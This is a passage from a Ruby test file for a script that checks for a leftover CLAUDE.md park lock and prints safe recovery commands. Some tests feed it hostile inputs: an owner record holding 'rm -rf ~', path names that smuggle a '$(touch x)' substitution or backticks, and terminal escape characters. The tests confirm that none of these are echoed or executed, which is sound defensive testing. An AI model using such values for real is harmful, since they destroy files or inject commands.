  # only copy under the lock's name.
  def test_gives_no_command_that_deletes_a_lock_that_is_a_file
    File.write(File.join(@tmp, 'CLAUDE.md.park-lock'), "# rules\n")

    out, err, status = check

    assert_equal 2, status.exitstatus, out + err
    assert_match(/is a file, where a park script makes a directory/, err)
    assert_match(%r{move it back to ~/CLAUDE\.md yourself}, err)
    assert_match(/wait for it to finish/, err)
    refute_match(/^  (mv|rm|rmdir) /, err)
    assert_no_arm_ran
  end

  def test_never_says_to_move_a_file_lock_over_a_claude_md_that_is_in_place
    File.write(File.join(@tmp, 'CLAUDE.md.park-lock'), "# rules\n")
    File.write(File.join(@tmp, 'CLAUDE.md'), "# newer rules\n")

    _out, err, status = check

    assert_equal 2, status.exitstatus, err
    assert_match(%r{A CLAUDE\.md is also in place at ~/CLAUDE\.md}, err)
    refute_match(/move it back/, err)
  end

  # Reading a named pipe waits for a writer that may never come.
  def test_does_not_say_to_read_a_lock_that_is_not_a_regular_file
    File.mkfifo(File.join(@tmp, 'CLAUDE.md.park-lock'))

    out, err, status = check

    assert_equal 2, status.exitstatus, out + err
    assert_match(/neither a file, a directory, nor a link/, err)
    refute_match(/read it/, err)
    assert_no_arm_ran
  end

  def test_gives_a_command_that_removes_a_lock_that_is_a_link_to_a_directory
    real = File.join(@tmp, 'elsewhere')
    FileUtils.mv(park, real)
    File.symlink(real, File.join(@tmp, 'CLAUDE.md.park-lock'))
    _out, err, status = check
    assert_equal 2, status.exitstatus, err
    commands = err.lines.grep(/^  (mv|rm|rmdir) /).map(&:strip)

    commands.each { |command| assert system({ 'HOME' => @tmp }, 'sh', '-c', command), command }
    out, err, status = check

    assert_equal 0, status.exitstatus, out + err
    assert_equal "# parked rules\n", File.read(File.join(@tmp, 'CLAUDE.md'))
  end

  def test_names_a_holder_once_from_a_record_that_repeats_itself_or_lacks_fields
    park(owner: "pid=1\npid=2\n")

    _out, err, status = check

    assert_equal 2, status.exitstatus, err
    assert_includes err, 'took the lock: process 1. If process 1 is still running, wait'
  end

  def test_treats_a_record_with_no_process_number_as_no_record
    ["pid=1; rm -rf ~\n", "started=Sun Oct  4 12:00:00 2026\n", ''].each do |owner|
      park(owner: owner)

      _out, err, status = check

      assert_equal 2, status.exitstatus, owner + err
      assert_match(/no record of what parked it/, err, owner)
      refute_includes err, 'rm -rf', owner
    end
  end

  def test_prints_no_control_character_from_an_owner_record
    park(owner: "checkout=/old\e[31m\npid=7\nstarted=then\a\n")

    _out, err, status = check

    assert_equal 2, status.exitstatus, err
    assert_includes err, 'took the lock: process 7. If'
    refute_match(/[\e\a]/, err)
  end

  def test_reports_a_park_lock_that_has_no_owner_record
    park(owner: nil)

    out, err, status = check

    assert_equal 2, status.exitstatus, out + err
    assert_match(/no record of what parked it/, err)
    assert_includes err, 'mv -n "$HOME/CLAUDE.md.park-lock/CLAUDE.md" "$HOME/CLAUDE.md"'
  end

  def test_never_tells_anyone_to_move_a_parked_file_over_one_that_is_in_place
    park
    File.write(File.join(@tmp, 'CLAUDE.md'), "# newer rules\n")

    out, err, status = check

    assert_equal 2, status.exitstatus, out + err
    assert_includes err, 'a CLAUDE.md is also in place at ~/CLAUDE.md.'
    refute_includes err, @tmp
    refute_match(/^  mv /, err)
    assert_no_arm_ran
  end

  def test_counts_a_dangling_link_as_a_claude_md_that_is_in_place
    park
    File.symlink(File.join(@tmp, 'dotfiles-gone'), File.join(@tmp, 'CLAUDE.md'))

    _out, err, status = check

    assert_equal 2, status.exitstatus, err
    assert_match(/a CLAUDE\.md is also in place/, err)
    refute_match(/^  mv /, err)
  end

  def test_reports_a_park_lock_that_is_a_dangling_link
    File.symlink(File.join(@tmp, 'gone'), File.join(@tmp, 'CLAUDE.md.park-lock'))

    out, err, status = check

    assert_equal 2, status.exitstatus, out + err
    assert_match(/holds no parked file/, err)
    assert_includes err, '  rm -f "$HOME/CLAUDE.md.park-lock"'
    refute_match(/^  rmdir /, err)
    assert_no_arm_ran
  end

  def test_gives_commands_that_work_from_anywhere_for_a_relative_config_directory
    park(File.join(@tmp, 'rel'))

    _out, err, status = Dir.chdir(@tmp) { check(CLAUDE_CONFIG_DIR: 'rel') }

    assert_equal 2, status.exitstatus, err
    assert_includes err, 'rmdir "$HOME/rel/CLAUDE.md.park-lock"'
  end

  def test_prints_no_command_for_a_path_double_quotes_cannot_carry
    ['a$(touch x)b', 'a"b', 'a`b', 'a\\b', 'a!b', "a\tb"].each do |name|
      config = File.join(@tmp, name)
      park(config)

      out, err, status = check(CLAUDE_CONFIG_DIR: config)

      assert_equal 2, status.exitstatus, "#{name}: #{out}#{err}"
      assert_match(/no command is printed/, err, name)
      refute_match(/^  (mv|rm|rmdir) /, err, name)
      refute_includes err, "\t", name
      refute File.exist?(@calls), "an arm ran under #{name}"
    end
  end

  def test_reports_an_empty_park_lock_and_how_to_clear_it
    FileUtils.rm(File.join(park, 'CLAUDE.md'))

    out, err, status = check

    assert_equal 2, status.exitstatus, out + err
    assert_match(/holds no parked file/, err)
    refute_match(/^  mv /, err)
    assert_includes err, 'rmdir "$HOME/CLAUDE.md.park-lock"'
    assert_no_arm_ran
  end

  def test_finds_a_park_lock_in_the_default_config_directory
    park(File.join(@tmp, '.claude'))

    out, err, status = check(CLAUDE_CONFIG_DIR: nil)

    assert_equal 2, status.exitstatus, out + err
    assert_includes err, 'rmdir "$HOME/.claude/CLAUDE.md.park-lock"'
    assert_no_arm_ran
  end

  def test_quotes_a_config_directory_outside_the_home_directory_as_it_is
    config = File.join(@tmp, 'elsewhere')
    park(config)

    _out, err, status = check(HOME: File.join(@tmp, 'home'), CLAUDE_CONFIG_DIR: config)

    assert_equal 2, status.exitstatus, err
    assert_includes err, %(rmdir "#{config}/CLAUDE.md.park-lock")
  end

  # --- usage and messages ---

  def test_refuses_arguments_and_runs_nothing
    out, err, status = check('--verbose')

    assert_equal 2, status.exitstatus, out + err
    assert_match(/usage/, err)
    assert_no_arm_ran
  end
end
